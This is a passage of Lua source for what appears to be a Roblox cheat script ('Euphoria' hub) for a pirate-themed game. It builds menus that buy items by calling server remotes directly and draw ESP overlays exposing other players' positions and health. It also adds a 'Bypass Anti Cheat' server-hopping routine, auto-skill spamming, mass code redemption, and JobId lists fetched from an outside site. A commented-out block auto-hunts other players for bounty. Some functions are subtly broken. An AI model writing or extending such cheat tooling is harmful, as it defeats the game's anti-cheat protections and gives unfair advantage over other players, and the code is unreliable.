            elseif SwordSelected == "Triple Katana" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Triple Katana")
            elseif SwordSelected == "Pipe" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Pipe")
            elseif SwordSelected == "Dual-Headed Blade" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual-Headed Blade")
            elseif SwordSelected == "Bisento" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Bisento")
            elseif SwordSelected == "Soul Cane" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Soul Cane")
            elseif SwordSelected == "Pole v.2" then
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ThunderGodTalk")
            end
        end)

        GunSelected = nil
        local GunSection = ShopTab:NewSection("Guns")
        GunSection:NewDropdown("Select Gun for buy", {"Slingshot", "Musket", "Flintlock", "Refined Slingshot", "Refined Flintlock", "Cannon", "Kabucha"}, function(choice)
            GunSelected = choice
        end)
        GunSection:NewButton("Buy Selected Sword", function()
            if GunSelected == "Slingshot" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Slingshot")
            elseif GunSelected == "Musket" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Musket")
            elseif GunSelected == "Flintlock" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Flintlock")
            elseif GunSelected == "Refined Slingshot" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Slingshot")
            elseif GunSelected == "Refined Flintlock" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Flintlock")
            elseif GunSelected == "Cannon" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cannon")
            elseif GunSelected == "Kabucha" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Slingshot","1")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Slingshot","2")
            end
        end)

        -- local PvPTab = Window:NewTab("PvP")
        -- local KillSection = PvPTab:NewSection("Kill Players")

        -- spawn(function()
        --     while wait() do
        --         pcall(function()
        --             if _G.KillPlayer then
        --                 prevLevel = math.huge
        --                 plr = nil
        --                 for i,v in pairs(game.Players:GetChildren()) do
        --                     if v.Data.Level.Value > 20 and v.Name ~= LP.Name and v.Data.Level.Value < prevLevel then
        --                         if LP.Data.Level.Value - v.Data.Level.Value > -500 or LP.Data.Level.Value - v.Data.Level.Value < 500 then
        --                             prevLevel = v.Data.Level.Value
        --                             plr = v
        --                         end
        --                     end
        --                 end
        --                 if plr then
        --                     _G.AimbotPos = plr.Character.HumanoidRootPart.Position
        --                     useNearestEntrance(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0))
        --                     followTarget(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0))
        --                     if getDistance(plr.Character.HumanoidRootPart.CFrame) < 40 then
        --                         if not LP.Character:FindFirstChildOfClass("Tool") then
        --                             for i,v in pairs(LP.Backpack:GetChildren()) do
        --                                 if string.find(v.Name, "-") then
        --                                     LP.Character.Humanoid:EquipTool(v)
        --                                 end
        --                             end
        --                         end
        --                         game:service('VirtualInputManager'):SendKeyEvent(true, "Z", false, game)
        --                         wait(.5)
        --                         game:service('VirtualInputManager'):SendKeyEvent(false, "Z", false, game)
        --                     end
        --                 end
        --             end
        --         end)
        --     end
        -- end)

        
        -- KillSection:NewToggle("Farm Bounty [Not save in settings]", function(state)
        --     _G.FarmBounty = state
        --     _G.DisableFastAttack = state
        --     if state then
        --         _G.FastSpeedMem = _G.FastSpeed
        --         _G.FastSpeed = 1
        --     else
        --         _G.FastSpeed = _G.FastSpeedMem or 0.2
        --     end
        -- end)

        -- spawn(function()
        --     while wait() do
        --         pcall(function()
        --             if _G.FarmBounty then
        --                 for i,v in pairs(game.Players:GetChildren()) do
        --                     _G.SkipTarget = false
        --                     if isAbleToKillBounty(v) then
        --                         StopTween()
        --                         repeat task.wait()
        --                             if useNearestEntrance(v.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0)) then
        --                                 StopTween()
        --                             end
        --                             _G.AimbotPos = v.Character.HumanoidRootPart.Position
        --                             followTarget(v.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0))
        --                             if getDistance(v.Character.HumanoidRootPart.CFrame) > 150 then
        --                                 _G.UseSkillsToKill = false
        --                                 _G.StartKilling = false
        --                                 _G.TargetName = false
        --                             else
        --                                 _G.UseSkillsToKill = true
        --                                 _G.StartKilling = true
        --                                 _G.TargetName = v.Name
        --                             end
        --                         until _G.SkipTarget or LP.Character.Humanoid.Health <= 0 or not LP or not v or not v:FindFirstChild("Humanoid") or v.Character.Humanoid.Health <= 0 or not _G.FarmBounty
        --                     end
        --                 end
        --             end
        --         end)
        --     end
        -- end)


        local EspTab = Window:NewTab("ESP")
        local EspSection = EspTab:NewSection("ESP")
        EspSection:NewToggle("Player ESP", function(state)
            _G.PlayerESP = state
        end)

        local function DestroyChams(character)
            for _, part in ipairs(character:GetChildren()) do
                if part:IsA("BasePart") and part.Transparency ~= 1 then
                    local glow = part:FindFirstChild("Glow")
                    local chams = part:FindFirstChild("Chams")
        
                    if glow then glow:Destroy() end
                    if chams then chams:Destroy() end
                end
            end
        end
        spawn(function()
            while wait() do
                pcall(function()
                    if _G.PlayerESP then
                        for _, player in pairs(game.Players:GetChildren()) do
                            if player ~= LP and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                local humanoid = player.Character:FindFirstChild("Humanoid")
                                if humanoid and humanoid.Health > 0 then
                                    local character = player.Character
                                    for _, part in pairs(character:GetChildren()) do
                                        if part:IsA("BasePart") and part.Transparency ~= 1 then
                                            if _G.PlayerESP then
                                                if not part:FindFirstChild("Glow") and not part:FindFirstChild("Chams") then
                                                    local chamsBox = Instance.new("BoxHandleAdornment", part)
                                                    chamsBox.Name = "Chams"
                                                    chamsBox.AlwaysOnTop = true
                                                    chamsBox.ZIndex = 4
                                                    chamsBox.Adornee = part
                                                    chamsBox.Color3 = Color3.fromRGB(252, 93, 102)
                                                    chamsBox.Transparency = 0.2
                                                    chamsBox.Size = part.Size + Vector3.new(0.02, 0.02, 0.02)
        
                                                    local glowBox = Instance.new("BoxHandleAdornment", part)
                                                    glowBox.Name = "Glow"
                                                    glowBox.AlwaysOnTop = false
                                                    glowBox.ZIndex = 3
                                                    glowBox.Adornee = part
                                                    glowBox.Color3 = Color3.fromRGB(250, 7, 20)
                                                    glowBox.Size = chamsBox.Size + Vector3.new(0.13, 0.13, 0.13)
                                                    glowBox.Transparency = 0
                                                end
                                            else
                                                DestroyChams(character)
                                            end
                                        end
                                    end
                                else
                                    DestroyChams(player.Character)
                                end
                            end
                        end
                    else
                        for _, player in pairs(game.Players:GetChildren()) do
                            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                local humanoid = player.Character:FindFirstChild("Humanoid")
                                if humanoid and humanoid.Health > 0 then
                                    DestroyChams(player.Character)
                                end
                            end
                        end
                    end
                end)
            end
        end)

        


        spawn(function()
            while wait() do
                pcall(function()
                    if _G.PlayerESP then
                        for i,v in pairs(game.Players:GetChildren()) do
                            if v.Name ~= LP.Name then
                                if not v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp") then
                                    local BillboardGui = Instance.new("BillboardGui")
                                    local TextLabel = Instance.new("TextLabel")
                                    BillboardGui.Parent = v.Character.HumanoidRootPart
                                    BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                                    BillboardGui.Active = true
                                    BillboardGui.Name = "PlayersEsp"
                                    BillboardGui.AlwaysOnTop = true
                                    BillboardGui.LightInfluence = 1.000
                                    BillboardGui.Size = UDim2.new(0, 150, 0, 50)
                                    BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
                                    TextLabel.Parent = BillboardGui
                                    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                                    TextLabel.BackgroundTransparency = 1.000
                                    TextLabel.Size = UDim2.new(0, 150, 0, 50)
                                    TextLabel.Font = Enum.Font.GothamBold
                                    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                                    TextLabel.TextSize = 12
                                    TextLabel.TextStrokeTransparency = 0
                                    TextLabel.TextWrapped = true
                                end
                                local Dis = math.floor((LP.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude / 10)
                                v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp").TextLabel.Text = v.Name.."\n"..Dis.." m".."\n["..math.floor(v.Character.Humanoid.Health).."/"..v.Character.Humanoid.MaxHealth.." HP]"
                                if v.Team.Name == "Pirates" then
                                    v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp").TextLabel.TextStrokeColor3 = Color3.new(255,0,0)
                                else
                                    v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp").TextLabel.TextStrokeColor3 = Color3.new(0,255,255)
                                end
                            end
                        end
                    else
                        for i,v in pairs(game.Players:GetChildren()) do
                            if v.Name ~= LP.Name then
                                if v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp") then
                                    v.Character.HumanoidRootPart.PlayersEsp:Destroy()
                                end
                            end
                        end
                    end
                end)
            end
        end)
        
        EspSection:NewToggle("Island ESP", function(state)
            _G.IslandESP = state
        end)
        EspSection:NewToggle("Chest ESP", function(state)
            _G.ChestESP = state
        end)
        
        getgenv().EuphoriaSettings["Distance X"] = 0
        getgenv().EuphoriaSettings["Distance Y"] = 30
        getgenv().EuphoriaSettings["Distance Z"] = 0

        local MiscTab = Window:NewTab("Misc")
        local MiscSection = MiscTab:NewSection("Misc")
        MiscSection:NewButton("Join Pirates Team", function()
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam", "Pirates")
        end)

        MiscSection:NewButton("Join Marines Team", function()
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam", "Marines")
        end)
        MiscSection:NewDropdown("Auto Join Team", {"Pirate", "Marine"}, function(choice)
            getgenv().EuphoriaSettings["Team"] = choice
            WriteSettings()
        end)
        MiscSection:NewLabel(" ")
        spamV3 = MiscSection:NewToggle("Auto Use V3 Skill", function(state)
            getgenv().EuphoriaSettings["Auto Use V3 Skill"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Auto Use V3 Skill"] then spamV3:UpdateToggle(nil, true) end
        spamV4 = MiscSection:NewToggle("Auto Use V4 Skill", function(state)
            getgenv().EuphoriaSettings["Auto Use V4 Skill"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Auto Use V4 Skill"] then spamV4:UpdateToggle(nil, true) end

        spawn(function()
            while wait(1) do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Use V3 Skill"] then
                        game:service('VirtualInputManager'):SendKeyEvent(true, "T", false, game)
                        game:service('VirtualInputManager'):SendKeyEvent(false, "T", false, game)
                    end
                    if getgenv().EuphoriaSettings["Auto Use V4 Skill"] then
                        game:service('VirtualInputManager'):SendKeyEvent(true, "Y", false, game)
                        game:service('VirtualInputManager'):SendKeyEvent(false, "Y", false, game)
                    end
                end)
            end
        end)

        MiscSection:NewLabel(" ")
        
        
        DistanceXSlider = MiscSection:NewSlider("Distance X", -30, 30, function(count)
            getgenv().EuphoriaSettings["Distance X"] = count
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Distance X"] then
            DistanceXSlider:UpdateValue(getgenv().EuphoriaSettings["Distance X"])
        else
            DistanceXSlider:UpdateValue(10)
        end
        DistanceYSlider = MiscSection:NewSlider("Distance Y", -30, 30, function(count)
            getgenv().EuphoriaSettings["Distance Y"] = count
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Distance Y"] then
            DistanceYSlider:UpdateValue(getgenv().EuphoriaSettings["Distance Y"])
        else
            DistanceYSlider:UpdateValue(30)
        end
        DistanceZSlider = MiscSection:NewSlider("Distance Z", -30, 30, function(count)
            getgenv().EuphoriaSettings["Distance Z"] = count
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Distance Z"] then
            DistanceZSlider:UpdateValue(getgenv().EuphoriaSettings["Distance Z"])
        else
            DistanceZSlider:UpdateValue(10)
        end
        rd = MiscSection:NewToggle("Random Distance", function(state)
            getgenv().EuphoriaSettings["Random Distance"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Random Distance"] then rd:UpdateToggle(nil, true) end

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Random Distance"] then
                        getgenv().EuphoriaSettings["Distance X"] = math.random(-30,30)
                        if math.random(0,1) == 1 then
                            getgenv().EuphoriaSettings["Distance Y"] = math.random(20,35)
                        else
                            getgenv().EuphoriaSettings["Distance Y"] = math.random(-15,-23)
                        end
                        getgenv().EuphoriaSettings["Distance Z"] = math.random(-30,30)
                    end
                    task.wait(.1)
                end)
            end
        end)
        MiscSection:NewLabel(" ")

        function OffsetCFrame()
            return CFrame.new(getgenv().EuphoriaSettings["Distance X"],getgenv().EuphoriaSettings["Distance Y"],getgenv().EuphoriaSettings["Distance Z"])
        end

        function RandomOffsetCFrame()
            return CFrame.new(math.random(-50,50), 0, math.random(-50,50))
        end

        function RandomOffsetCFrameSeaBeast()
            negatX = math.random(0,2)
            negatY = math.random(0,2)
            if negatX == 0 then
                local X = math.random(40,90)
            else
                local X = math.random(-90, -40)
            end
            if negatY == 0 then
                local Y = math.random(40,90)
            else
                local Y = math.random(-90, -40)
            end
            return CFrame.new(X, 0, Y)
        end


        TweenSpeedSlider = MiscSection:NewSlider("Tween Speed", 1, 600, function(count)
            _G.TweenSpeed = count
            getgenv().EuphoriaSettings["Tween Speed"] = count
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Tween Speed"] then
            TweenSpeedSlider:UpdateValue(getgenv().EuphoriaSettings["Tween Speed"])
        else
            TweenSpeedSlider:UpdateValue(350)
        end

        if getgenv().EuphoriaSettings["Remove Fog"] == nil then
            getgenv().EuphoriaSettings["Remove Fog"] = true
        end
         
        removefog = MiscSection:NewToggle("Remove Fog", function(state)
            getgenv().EuphoriaSettings["Remove Fog"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Remove Fog"] then removefog:UpdateToggle(nil, true) end

        if getgenv().EuphoriaSettings["Walk On Water"] == nil then
            getgenv().EuphoriaSettings["Walk On Water"] = true
        end
         
        walkonwater = MiscSection:NewToggle("Walk On Water", function(state)
            getgenv().EuphoriaSettings["Walk On Water"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Walk On Water"] then walkonwater:UpdateToggle(nil, true) end
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Walk On Water"] then
                        game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,112,1000)
                    else
                        game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,80,1000)
                    end
                end)
            end
        end)
        afk = MiscSection:NewToggle("Anti AFK", function(state)
            _G.AntiAFK = state
        end)
        afk:UpdateToggle(nil, true)
        
        anticheat = MiscSection:NewToggle("Bypass Anti Cheat", function(state)
            getgenv().EuphoriaSettings['Anti Cheat'] = state
            WriteSettings()
            _G.AntiCheat = state
        end)
        if getgenv().EuphoriaSettings['Anti Cheat'] then anticheat:UpdateToggle(nil, true) end
        if getgenv().EuphoriaSettings['Anti Cheat'] == nil then anticheat:UpdateToggle(nil, true) end
        autorejoin = MiscSection:NewToggle("Auto Rejoin", function(state)
            getgenv().EuphoriaSettings['Auto Rejoin'] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings['Auto Rejoin'] then autorejoin:UpdateToggle(nil, true) end
        if getgenv().EuphoriaSettings['Auto Rejoin'] == nil then autorejoin:UpdateToggle(nil, true) end

        if _G.TestNewBypass then
            rd:UpdateToggle(nil, true)
            anticheat:UpdateToggle(nil, false)
        end

        spawn(function()
            while wait(.1) do
                pcall(function()
                    if _G.AntiCheat then
                        if workspace.DistributedGameTime+0.5 > 1800 then
                            if #game.Players:GetChildren() < 3 then
                                HopServer()
                            else
                                TeleportService:Teleport(game.PlaceId, LP)
                            end
                        end
                    end
                end)
            end
        end)

        fu = MiscSection:NewToggle("Fast Attack", function(state)
            _G.FastAttack = state
        end)
        fu:UpdateToggle(nil, true)
        MiscSection:NewButton("Redeem All Codes", function()
                local redeem = function(code)
                    local args = {
                        [1] = code
                    }
                    ReplicatedStorage.Remotes.Redeem:InvokeServer(unpack(args))
                end
                redeem("24NOADMIN")
                redeem("REWARDFUN")
                redeem("TRIPLEABUSE")
                redeem("SEATROLLING")
                redeem("SECRET_ADMIN")
                redeem("KITT_RESET")
                redeem("Sub2CaptainMaui")
                redeem("SUB2GAMERROBOT_RESET1")
                redeem("kittgaming")
                redeem("Sub2Fer999")
                redeem("Enyu_is_Pro")
                redeem("Magicbus")
                redeem("JCWK")
                redeem("Starcodeheo")
                redeem("Bluxxy")
                redeem("fudd10_v2")
                redeem("FUDD10")
                redeem("BIGNEWS")
                redeem("THEGREATACE")
                redeem("SUB2GAMERROBOT_EXP1")
                redeem("Sub2OfficialNoobie")
                redeem("StrawHatMaine")
                redeem("SUB2NOOBMASTER123")
                redeem("Sub2UncleKizaru")
                redeem("Sub2Daigrock")
                redeem("Axiore")
                redeem("TantaiGaming")               
                redeem("NEWTROLL")               
            end
        )

        ServerSection:NewButton("Rejoin Server", function()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
        end)
        ServerSection:NewButton("Hop Server", function()
            HopServer()
        end)
        ServerSection:NewButton("Hop to Low Players Server", function()
            HopToLowestServer()
        end)
        local lj = getgenv().EuphoriaSettings["lastjobid"] or " "
        local currJobId = ServerSection:NewLabel("Current JobID: " .. game.JobId)
        local lastJobId = ServerSection:NewLabel("Last JobID: " .. lj)
        ServerSection:NewTextBox("Job ID", function(jobid)
            _G.JobID = jobid
        end)
        ServerSection:NewToggle("Try to Hop Every 5 seconds", function(state)
            _G.TryHop = state
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    wait(5)
                    if _G.TryHop and _G.JobID then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, _G.JobID)
                    end
                end)
            end
        end)
        ServerSection:NewButton("Hop server to JobID", function()
            getgenv().EuphoriaSettings["lastjobid"] = _G.JobID
            WriteSettings()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, _G.JobID)
        end)
        ServerSection:NewButton("Hop to last JobID", function()
            if getgenv().EuphoriaSettings["lastjobid"] then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, getgenv().EuphoriaSettings["lastjobid"])
            end
        end)
        ServerSection:NewButton("Copy my JobID", function()
            setclipboard(game.JobId)
        end)

        local WebhookSection = ServerTab:NewSection("Webhooks")
        WebhookSection:NewButton("Open Mirage Webhooks", function()
            repeat wait() until game:IsLoaded()
            repeat wait() until game:FindFirstChild("CoreGui")

            for i,v in pairs(game.CoreGui:GetChildren()) do
                if v:IsA("ScreenGui") and v.Name == "MirageWebhook" then
                    v:Destroy()
                end
            end

            local title = "Mirage Webhooks"

            MainScreenGui = Instance.new("ScreenGui")
            FrameMain = Instance.new("Frame")

            Library:DraggingEnabled(FrameMain)
            
            FrameTitle = Instance.new("TextLabel")
            FrameCloseButton = Instance.new("TextButton")
            FrameRefreshButton = Instance.new("TextButton")

            MainScreenGui.Parent = game.CoreGui 
            MainScreenGui.Name = "MirageWebhook"
            MainScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            MainScreenGui.ResetOnSpawn = false

            function createWebhook(frame, JobId, time)
                JobIdText = Instance.new("TextLabel")
                TimeText = Instance.new("TextLabel")
                WebhookJoinButton = Instance.new("TextButton")
                WebhookCopyButton = Instance.new("TextButton")

                JobIdText.Name = "jobid" .. math.random(0,999999)
                JobIdText.Parent = frame
                JobIdText.BackgroundTransparency = 1
                JobIdText.BorderSizePixel = 0
                JobIdText.Position = UDim2.new(0.02, 0, 0, WebhookOffset)
                JobIdText.Size = UDim2.new(0, 204, 0, 20)
                JobIdText.Font = Enum.Font.Gotham
                JobIdText.RichText = true
                JobIdText.Text = JobId
                JobIdText.TextColor3 = Color3.fromRGB(245, 245, 245)
                JobIdText.TextSize = 16
                JobIdText.TextXAlignment = Enum.TextXAlignment.Left

                WebhookOffset = WebhookOffset + 19
                if game.JobId == JobId then
                    time = time .. " (You here)"
                end
                TimeText.Name = "timetext" .. math.random(0,999999)
                TimeText.Parent = frame
                TimeText.BackgroundTransparency = 1
                TimeText.BorderSizePixel = 0
                TimeText.Position = UDim2.new(0.02, 0, 0, WebhookOffset)
                TimeText.Size = UDim2.new(0, 204, 0, 20)
                TimeText.Font = Enum.Font.Gotham
                TimeText.RichText = true
                TimeText.Text = time
                TimeText.TextColor3 = Color3.fromRGB(245, 245, 245)
                TimeText.TextSize = 16
                TimeText.TextXAlignment = Enum.TextXAlignment.Left

                WebhookJoinButton.Name = "joinWebhook" .. math.random(0,999999)
                WebhookJoinButton.Parent = frame
                WebhookJoinButton.BackgroundTransparency = 0.2
                WebhookJoinButton.AutoButtonColor = false
                WebhookJoinButton.BackgroundColor3 = Color3.fromRGB(20,20,20)
                WebhookJoinButton.BorderSizePixel = 0
                WebhookJoinButton.Position = UDim2.new(1, -121, 0, WebhookOffset + 3)
                WebhookJoinButton.Size = UDim2.new(0, 60, 0, 17)
                WebhookJoinButton.Font = Enum.Font.Gotham
                WebhookJoinButton.RichText = true
                WebhookJoinButton.Text = "Join"
                WebhookJoinButton.TextColor3 = Color3.fromRGB(245, 245, 245)
                WebhookJoinButton.TextSize = 16.000
                WebhookJoinButton.TextXAlignment = Enum.TextXAlignment.Center
                WebhookJoinButton.MouseButton1Click:Connect(function()
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, JobId)
                end)

                WebhookCopyButton.Name = "copyWebhook" .. math.random(0,999999)
                WebhookCopyButton.Parent = frame
                WebhookCopyButton.BackgroundTransparency = 0.2
                WebhookCopyButton.AutoButtonColor = false
                WebhookCopyButton.BackgroundColor3 = Color3.fromRGB(20,20,20)
                WebhookCopyButton.BorderSizePixel = 0
                WebhookCopyButton.Position = UDim2.new(1, -60, 0, WebhookOffset + 3)
                WebhookCopyButton.Size = UDim2.new(0, 60, 0, 17)
                WebhookCopyButton.Font = Enum.Font.Gotham
                WebhookCopyButton.RichText = true
                WebhookCopyButton.Text = "Copy"
                WebhookCopyButton.TextColor3 = Color3.fromRGB(245, 245, 245)
                WebhookCopyButton.TextSize = 16.000
                WebhookCopyButton.TextXAlignment = Enum.TextXAlignment.Center
                WebhookCopyButton.MouseButton1Click:Connect(function()
                    setclipboard(JobId)
                end)

                WebhookOffset = WebhookOffset + 30
            end
            
            FrameMain.Name = "Main"
            FrameMain.Parent = MainScreenGui
            FrameMain.BackgroundTransparency = 0
            FrameMain.BackgroundColor3 = Color3.fromRGB(1,1,1)
            FrameMain.ClipsDescendants = true
            FrameMain.Position = UDim2.new(0.15, 0, 0.05, 0)
            FrameMain.Size = UDim2.new(0, 370, 0, 600)

            FrameTitle.Name = "frameTitle"
            FrameTitle.Parent = FrameMain
            FrameTitle.BackgroundTransparency = 1
            FrameTitle.BorderSizePixel = 0
            FrameTitle.Position = UDim2.new(0.5, -70, 0.001, 0)
            FrameTitle.Size = UDim2.new(0, 204, 0, 16)
            FrameTitle.Font = Enum.Font.Gotham
            FrameTitle.RichText = true
            FrameTitle.Text = "Mirage Webhooks"
            FrameTitle.TextColor3 = Color3.fromRGB(245, 245, 245)
            FrameTitle.TextSize = 20.000
            FrameTitle.TextXAlignment = Enum.TextXAlignment.Left
            
            FrameCloseButton.Name = "frameClose"
            FrameCloseButton.Parent = FrameMain
            FrameCloseButton.BackgroundTransparency = 0.2
            FrameCloseButton.AutoButtonColor = false
            FrameCloseButton.BackgroundColor3 = Color3.fromRGB(20,20,20)
            FrameCloseButton.BorderSizePixel = 0
            FrameCloseButton.Position = UDim2.new(1, -60, 0.002, 0)
            FrameCloseButton.Size = UDim2.new(0, 60, 0, 20)
            FrameCloseButton.Font = Enum.Font.Gotham
            FrameCloseButton.RichText = true
            FrameCloseButton.Text = "X"
            FrameCloseButton.TextColor3 = Color3.fromRGB(245, 245, 245)
            FrameCloseButton.TextSize = 20.000
            FrameCloseButton.TextXAlignment = Enum.TextXAlignment.Center
            FrameCloseButton.MouseButton1Click:Connect(function()
                for i,v in pairs(game.CoreGui:GetChildren()) do
                    if v:IsA("ScreenGui") and v.Name == "MirageWebhook" then
                        v:Destroy()
                    end
                end
            end)

            FrameRefreshButton.Name = "frameRefresh"
            FrameRefreshButton.Parent = FrameMain
            FrameRefreshButton.BackgroundTransparency = 0.2
            FrameRefreshButton.AutoButtonColor = false
            FrameRefreshButton.BackgroundColor3 = Color3.fromRGB(20,20,20)
            FrameRefreshButton.BorderSizePixel = 0
            FrameRefreshButton.Position = UDim2.new(0, 0, 0.002, 0)
            FrameRefreshButton.Size = UDim2.new(0, 80, 0, 20)
            FrameRefreshButton.Font = Enum.Font.Gotham
            FrameRefreshButton.RichText = true
            FrameRefreshButton.Text = "Refresh"
            FrameRefreshButton.TextColor3 = Color3.fromRGB(245, 245, 245)
            FrameRefreshButton.TextSize = 20.000
            FrameRefreshButton.TextXAlignment = Enum.TextXAlignment.Center
            FrameRefreshButton.MouseButton1Click:Connect(function()
                for i,v in pairs(FrameMain:GetChildren()) do
                    if v.Name == "WebhookFrame" then
                        v:Destroy()
                    end
                end
                FrameWebhook = Instance.new("Frame")
                FrameWebhook.Name = "WebhookFrame"
                FrameWebhook.Parent = FrameMain
                FrameWebhook.BackgroundTransparency = 0
                FrameWebhook.BackgroundColor3 = Color3.fromRGB(1,1,1)
                FrameWebhook.ClipsDescendants = true
                FrameWebhook.Position = UDim2.new(0, 0, 0, 30)
                FrameWebhook.Size = UDim2.new(0, 370, 0, 600)

                r = game:HttpGet("https://deadcxde.xyz/api/getWebhooks.php?type=mirage")
                resp = game:GetService("HttpService"):JSONDecode(r)
                WebhookOffset = 0
                for i, webhook in ipairs(resp) do
                    createWebhook(FrameWebhook, webhook['JobId'], webhook['time'])
                end
            end)

            

        end)
        WebhookSection:NewButton("Open Fullmoon Webhooks", function()
            repeat wait() until game:IsLoaded()
            repeat wait() until game:FindFirstChild("CoreGui")

            for i,v in pairs(game.CoreGui:GetChildren()) do
                if v:IsA("ScreenGui") and v.Name == "FullmoonWebhook" then
                    v:Destroy()
                end
            end

            local title = "Fullmoon Webhooks"

            MainScreenGui = Instance.new("ScreenGui")
            FrameMain = Instance.new("Frame")

            Library:DraggingEnabled(FrameMain)
            
            FrameTitle = Instance.new("TextLabel")
            FrameCloseButton = Instance.new("TextButton")
            FrameRefreshButton = Instance.new("TextButton")

            MainScreenGui.Parent = game.CoreGui 
            MainScreenGui.Name = "FullmoonWebhook"
            MainScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            MainScreenGui.ResetOnSpawn = false

            function createWebhook(frame, JobId, time, time_remaining)
                JobIdText = Instance.new("TextLabel")
                TimeText = Instance.new("TextLabel")
                TimeRemainingText = Instance.new("TextLabel")
                WebhookJoinButton = Instance.new("TextButton")
                WebhookCopyButton = Instance.new("TextButton")

                JobIdText.Name = "jobid" .. math.random(0,999999)
                JobIdText.Parent = frame
                JobIdText.BackgroundTransparency = 1
                JobIdText.BorderSizePixel = 0
                JobIdText.Position = UDim2.new(0.02, 0, 0, WebhookOffset)
                JobIdText.Size = UDim2.new(0, 204, 0, 20)
                JobIdText.Font = Enum.Font.Gotham
                JobIdText.RichText = true
                JobIdText.Text = JobId
                JobIdText.TextColor3 = Color3.fromRGB(245, 245, 245)
                JobIdText.TextSize = 16
                JobIdText.TextXAlignment = Enum.TextXAlignment.Left

                WebhookOffset = WebhookOffset + 19

                TimeRemainingText.Name = "timeremaining" .. math.random(0,999999)
                TimeRemainingText.Parent = frame
                TimeRemainingText.BackgroundTransparency = 1
                TimeRemainingText.BorderSizePixel = 0
                TimeRemainingText.Position = UDim2.new(0.02, 0, 0, WebhookOffset)
                TimeRemainingText.Size = UDim2.new(0, 204, 0, 20)
                TimeRemainingText.Font = Enum.Font.Gotham
                TimeRemainingText.RichText = true
                TimeRemainingText.Text = "Time Remaining: " .. time_remaining
                TimeRemainingText.TextColor3 = Color3.fromRGB(245, 245, 245)
                TimeRemainingText.TextSize = 16
                TimeRemainingText.TextXAlignment = Enum.TextXAlignment.Left

                WebhookOffset = WebhookOffset + 19
                if game.JobId == JobId then
                    time = time .. " (You here)"
                end
                TimeText.Name = "timetext" .. math.random(0,999999)
                TimeText.Parent = frame
                TimeText.BackgroundTransparency = 1
                TimeText.BorderSizePixel = 0
                TimeText.Position = UDim2.new(0.02, 0, 0, WebhookOffset)
                TimeText.Size = UDim2.new(0, 204, 0, 20)
                TimeText.Font = Enum.Font.Gotham
                TimeText.RichText = true
                TimeText.Text = time
                TimeText.TextColor3 = Color3.fromRGB(245, 245, 245)
                TimeText.TextSize = 16
                TimeText.TextXAlignment = Enum.TextXAlignment.Left

                WebhookJoinButton.Name = "joinWebhook" .. math.random(0,999999)
                WebhookJoinButton.Parent = frame
                WebhookJoinButton.BackgroundTransparency = 0.2
                WebhookJoinButton.AutoButtonColor = false
                WebhookJoinButton.BackgroundColor3 = Color3.fromRGB(20,20,20)
                WebhookJoinButton.BorderSizePixel = 0
                WebhookJoinButton.Position = UDim2.new(1, -121, 0, WebhookOffset + 3)
                WebhookJoinButton.Size = UDim2.new(0, 60, 0, 17)
